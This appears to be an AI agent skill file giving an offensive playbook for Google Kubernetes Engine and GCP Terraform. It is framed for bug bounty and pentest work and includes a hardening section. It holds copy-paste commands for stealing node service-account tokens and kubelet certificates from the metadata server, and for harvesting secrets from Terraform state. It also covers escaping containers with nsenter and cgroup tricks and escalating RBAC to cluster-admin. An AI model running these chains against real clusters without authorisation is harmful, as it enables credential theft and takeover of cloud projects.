---
name: gke-terraform-offensive
description: Offensive security for Google Kubernetes Engine (GKE) and GCP Terraform — recon of clusters and exposed Terraform state, attack surface of .tf/.tfvars/tfstate (plaintext secrets, GCS backend squatting, SA keys in CI), full catalog of dangerous GKE settings (public control plane, legacy ABAC, no Workload Identity, legacy metadata/kube-env, over-privileged node SA, no NetworkPolicy, no shielded nodes, public node IPs), attack chains (app SSRF to 169.254.169.254 node SA token, pod compromise to cluster takeover, container escape via privileged/hostPath/CAP_SYS_ADMIN, RBAC privesc, kube-env kubelet cert theft), GCP post-exploitation from node/Workload Identity SA, plus a hardening/build section to deploy your own private GKE. Spanish triggers — "gke", "google kubernetes engine", "terraform gcp", "terraform google", "atacar gke", "gke misconfig", "gke pentest", "gke bug bounty", "tfstate expuesto", "terraform state secrets", "gcs backend terraform", "workload identity", "metadata 169.254.169.254 gke", "node service account gke", "kube-env", "container escape gke", "pod privesc kubernetes", "rbac privesc", "kubectl auth can-i", "cluster privado gke", "gke hardening", "shielded nodes", "network policy gke", "legacy abac", "master authorized networks", "gke ssrf", "privesc gcp desde pod", "clusterrole-aggregation-controller", "crac kubernetes", "projected service account token", "var lib kubelet pods", "fluentbit privesc", "gke autopilot", "allowlistedworkloads", "metadata protection downgrade", "wif bypass gke", "update deployments privesc".
---

## Scope & orientation
Offensive-first (bug bounty / pentest) reference for GKE + GCP Terraform, with a build/hardening section so you understand the defended state well enough to deploy your own. Two leverage points dominate real findings:
1. **Terraform artifacts** leak secrets and infra topology (`tfstate`, `.tfvars`, CI logs, GCS backends).
2. **GKE node/pod metadata + RBAC** turn a single app bug (SSRF, RCE in a pod) into a GCP project compromise via the node service account.

Deep material lives in `references/`:
- `gke-misconfig-catalog.md` — every dangerous Terraform setting → why → exact attack.
- `gke-attack-playbook.md` — copy-paste `gcloud`/`kubectl`/`curl` for each step.
- `gke-real-world-chains.md` — accepted VRP + top-research privesc chains (projected-token harvesting, CRAC, deployment SA-swap, Autopilot allowlistedworkloads, WI downgrade). **Read this for the in-cluster privesc playbook.**
- `audit-checklist.md` — CIS GKE Benchmark-mapped audit checklist (for pentest reports).
- `terraform-hardened-gke.tf` — production-grade private cluster module (the "right" config).

Per engagement rules: in theoretical mode, present the exact command ready to copy/paste but do NOT execute network/cluster interaction until the user explicitly approves each one.

---

## 1. Recon — find the cluster and its Terraform

**Public GKE control planes** (when `master_authorized_networks` allows `0.0.0.0/0` or is empty):
- API server is HTTPS on the control-plane public IP, `/version` and `/healthz` are unauthenticated.
- `curl -sk https://<CP_IP>/version` → leaks exact GKE/k8s version → map to CVEs.
- `kubectl --server=https://<CP_IP> --insecure-skip-tls-verify version` → anonymous probing.
- Shodan: `ssl.cert.subject.cn:"kube-apiserver"`, `product:"Kubernetes"`, port `10250` (kubelet), `6443`/`443`.

**Terraform artifact exposure** (highest-value, fastest wins):
- GitHub/GitLab recon: `org:<target> extension:tf`, `path:*.tfvars`, `"google_container_cluster"`, `"backend "gcs""`.
- Exposed `terraform.tfstate` → **all** Kubernetes secrets, SA keys, DB passwords in **plaintext**.
- `backend.tf` reveals the GCS state bucket name → try read/squat (`gsutil ls gs://<bucket>`).
- CI logs (Cloud Build, GitHub Actions) printing `terraform plan` with `-var` secrets or `GOOGLE_CREDENTIALS`.
- `.terraform/` committed → provider config, sometimes cached state.

**GCP surface mapping** (once you have any credential/token):
- `gcloud projects list`, `gcloud container clusters list`, `gcloud container clusters get-credentials <c> --zone <z>`.

---

## 2. Terraform / tfstate attack surface

| Artifact | What leaks | Attack |
|---|---|---|
| `terraform.tfstate` (local or GCS) | k8s Secrets, `google_service_account_key`, DB creds — plaintext | Read state → extract SA private key → `gcloud auth activate-service-account` |
| `*.tfvars` in git | project IDs, SA emails, sometimes inline secrets | Topology map + creds |
| `backend "gcs"` block | state bucket name | `gsutil ls/cat gs://<bucket>` if IAM weak / public |
| CI/CD pipeline | `GOOGLE_CREDENTIALS`, plan output | Token/key exfil from logs |
| `google_service_account_key` resource | a long-lived JSON key was created | Pivot — these are the keys that end up leaked |

Key insight: Terraform **state is the crown jewels**. A `kubernetes_secret`, `random_password`, or `google_service_account_key` resource stores its value verbatim in state. A readable state bucket = full credential dump. See `gke-misconfig-catalog.md` for the resource-by-resource breakdown.

---

## 3. GKE misconfiguration catalog (Terraform → impact)

Dangerous `google_container_cluster` / `google_container_node_pool` settings. Full detail + the secure counter-value in `gke-misconfig-catalog.md`.

| Terraform setting | Insecure value | Offensive impact |
|---|---|---|
| `master_authorized_networks_config` | absent / `0.0.0.0/0` | Public API server — anonymous version disclosure, brute/CVE surface |
| `enable_legacy_abac` | `true` | ABAC grants broad implicit access; bypasses RBAC |
| `workload_identity_config` | absent | Pods reach the **node SA** via metadata → token theft = node SA power |
| node `metadata.disable-legacy-endpoints` | `"false"` | `v1beta1` metadata without `Metadata-Flavor` header → easier SSRF |
| `node_config.service_account` | default Compute SA (`Editor`) | Node SA token = project Editor → game over |
| `node_config.oauth_scopes` | `cloud-platform` | Node SA token has full API scope |
| `network_policy` / dataplane v2 | disabled | No pod-to-pod segmentation; lateral movement free |
| `node_config.shielded_instance_config` | secure boot / integrity off | Tampered node boot, rootkit persistence |
| `private_cluster_config` | absent | Nodes get **public IPs** — directly reachable |
| `node_config.metadata` `kube-env` | exposed (legacy) | Kubelet cert/key theft → impersonate `system:node` |
| `release_channel` | absent + old version | Unpatched CVEs (e.g. kubelet, ingress, NGINX) |
| `enable_shielded_nodes` | `false` | combined with above |
| binary authorization | disabled | Run arbitrary/unsigned images |

---

## 4. Core attack chains

### 4.1 App SSRF → node service account token (the money chain)
A pod-hosted app with SSRF, or any code-exec in a pod **without Workload Identity**, can hit the GCE metadata server (the node's identity):
```
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes"
```
- If `disable-legacy-endpoints=false`: `http://metadata.google.internal/computeMetadata/v1beta1/...` works **without** the header (better for SSRF where you can't set headers).
- Token → `gcloud`/REST against GCP. If the node SA is the default Compute SA or has `cloud-platform` scope + Editor, you own the project.
- **Workload Identity raises the bar but is not absolute**: `gke-metadata-server` makes pods get their *bound* SA, not the node SA. Confirmed downgrade (Cloud VRP, Jakub Domeracki, FIXED): if you can **patch node labels** (K8s RBAC `patch nodes`, or GCP `container.nodes.update` — included in `roles/container.developer`), set `iam.gke.io/gke-metadata-server-enabled=false` to evict `gke-metadata-server` → the pod then reads the **node SA token** directly at `metadata.google.internal`. GKE Standard only (Autopilot blocks via GKE Warden). Always test *both* the WI-bound token and a direct `169.254.169.254` hit, and check every node pool. Full PoC in `gke-real-world-chains.md` §E.

### 4.2 kube-env → kubelet credential theft (legacy / metadata concealment off)
```
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env"
```
- Yields `KUBELET_CERT` / `KUBELET_KEY` / `CA_CERT`. Authenticate to the API server as `system:node:<node>`.
- Via the Node authorizer, read Secrets of pods scheduled on that node → harvest any privileged SA token → escalate to cluster-admin. Mitigated by **metadata concealment** (`workload-metadata-server` / WI) and `disable-legacy-endpoints=true`.

### 4.3 Pod compromise → cluster takeover (RBAC privesc)
```
kubectl auth can-i --list
ls /var/run/secrets/kubernetes.io/serviceaccount/   # automounted token
```
Look for: `create pods` (mount any SA token / schedule on master-tainted node), `get/list secrets`, `escalate`/`bind` on roles, `impersonate` on users/groups/SAs, `create clusterrolebindings`. Any one → cluster-admin. Details in `gke-attack-playbook.md`.

**Non-obvious privesc primitives (real VRP/research chains — see `gke-real-world-chains.md`):**
- **`/var/lib/kubelet/pods` exposure** (FluentBit/Datadog/logging DaemonSets, hostPath mounts) → harvest the **projected SA token of every pod on the node** from `kube-api-access-*/token`.
- **`update`/`patch` on `deployments`** (e.g. `metrics-server`) ≈ cluster-admin: swap `serviceAccountName` to an admin SA, the new pod gets its token.
- **`clusterrole-aggregation-controller` (CRAC)** token → self-grant cluster-admin via aggregation labels (no `escalate`/`bind` needed).
- **Autopilot**: `allowlistedworkloads` CRD masquerade (image/command-only checks) + `nodeName` scheduling to land on nodes hosting privileged system pods; persist via invisible mutating admission webhook.

### 4.4 Container escape → node → metadata
- **Privileged pod**: mount the host disk, `nsenter` into host PID namespace.
- **hostPath `/`** mount: `chroot` host filesystem, read `/var/lib/kubelet`, kubeconfigs, SA tokens.
- **hostPID + privileged**: `nsenter -t 1 -m -u -i -n -p -- bash`.
- **CAP_SYS_ADMIN**: cgroup `release_agent` escape.
- **Mounted `docker.sock`/`containerd.sock`**: create a privileged container.
- After escape → node filesystem → metadata token (4.1) → GCP.

### 4.5 GCP post-exploitation from a node / WI SA
With any SA token (`gcloud auth activate-service-account` or `gcloud auth login --cred-file`):
```
gcloud projects get-iam-policy <PROJECT>
gcloud iam service-accounts list
gcloud iam service-accounts get-iam-policy <SA>          # actAs / token creator?
gcloud secrets list && gcloud secrets versions access ...
gsutil ls && gsutil ls gs://<bucket>
```
Look for `iam.serviceAccounts.actAs` / `roles/iam.serviceAccountTokenCreator` → impersonate a higher-priv SA → lateral/vertical movement. Cross-reference your existing `bughunters-ssrf-gcp` skill for metadata SSRF bypasses and `pentest-ssrf-redirect-server` for redirect-based delivery.

---

## 5. Quick triage commands (read-only, still require approval)
```
# cluster posture
gcloud container clusters describe <c> --zone <z> --format="yaml(privateClusterConfig,masterAuthorizedNetworksConfig,networkPolicy,workloadIdentityConfig,legacyAbac,releaseChannel,nodeConfig.serviceAccount,nodeConfig.oauthScopes,nodeConfig.shieldedInstanceConfig)"
# from inside a pod
kubectl auth can-i --list
kubectl get secrets -A 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d 2>/dev/null
```

---

## 6. Build / hardening (so you can deploy your own)
The secure baseline — every item neutralizes a section-4 chain. Full module in `references/terraform-hardened-gke.tf`.

- **Private cluster**: `private_cluster_config { enable_private_nodes = true; enable_private_endpoint = true }` — no public node IPs, private control plane.
- **Authorized networks**: restrict `master_authorized_networks_config` to your bastion/CIDR only.
- **Workload Identity**: `workload_identity_config { workload_pool = "<PROJECT>.svc.id.goog" }` + per-workload GCP SA binding — kills 4.1/4.2.
- **Minimal node SA**: dedicated SA with only `logging.logWriter`, `monitoring.metricWriter`, `monitoring.viewer`, `stackdriver.resourceMetadata.writer`, `artifactregistry.reader`. Never the default Compute SA, never `cloud-platform` scope.
- **Metadata hardening**: `node_config.metadata = { disable-legacy-endpoints = "true" }` + WI metadata concealment.
- **Shielded nodes**: `enable_shielded_nodes = true`, secure boot + integrity monitoring.
- **NetworkPolicy / Dataplane v2**: `datapath_provider = "ADVANCED_DATAPATH"`.
- **No legacy ABAC**: `enable_legacy_abac = false` (default, but assert it).
- **Release channel**: `release_channel { channel = "REGULAR" }` for auto-patching.
- **State backend**: GCS bucket with uniform bucket-level access, versioning, CMEK, no public IAM; never commit state; mark secret outputs `sensitive = true` (note: still plaintext in state — keep the bucket locked down).
- **Binary Authorization**, **Pod Security Admission `restricted`**, disable `automountServiceAccountToken` by default.

---

## Cross-references
- `gke-real-world-chains.md` (this skill) — accepted VRP + Unit42/Rhino chains; the in-cluster privesc playbook.
- `bughunters-ssrf-gcp` — metadata SSRF bypass table (0.0.0.0, IPv6-mapped, redirect-to-metadata).
- `pentest-ssrf-redirect-server` — delivering the SSRF to `169.254.169.254`.
- `google-vrp-cloud` — GKE Workload Identity, GCS bucket squatting, Cloud VRP scope.
- `pentest-network` — node/service version → CVE workflow.
